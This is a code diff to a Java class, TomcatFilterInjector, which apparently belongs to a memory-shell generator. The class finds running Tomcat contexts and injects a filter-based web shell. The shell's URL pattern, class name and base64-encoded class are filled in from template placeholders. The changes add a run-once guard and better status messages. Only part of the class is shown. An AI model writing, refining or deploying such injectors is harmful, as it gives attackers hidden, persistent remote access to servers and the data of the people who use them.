@@ -18,18 +18,36 @@ import java.util.zip.GZIPInputStream;
 public class TomcatFilterInjector {
 
     private String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TomcatFilterInjector() {
+        if (ok) {
+            return;
+        }
         Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
-                msg += ("context: [" + getContextRoot(context) + "] ");
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
                     msg += "[" + getUrlPattern() + "] ready\n";
@@ -38,6 +56,7 @@ public class TomcatFilterInjector {
                 }
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
@@ -57,19 +76,6 @@ public class TomcatFilterInjector {
         }
         return c + "(" + r + ")";
     }
-
-    public String getUrlPattern() {
-        return "{{urlPattern}}";
-    }
-
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() {
-        return "{{base64Str}}";
-    }
-
     /**
      * org.apache.catalina.core.StandardContext
      * /usr/local/tomcat/server/lib/catalina.jar
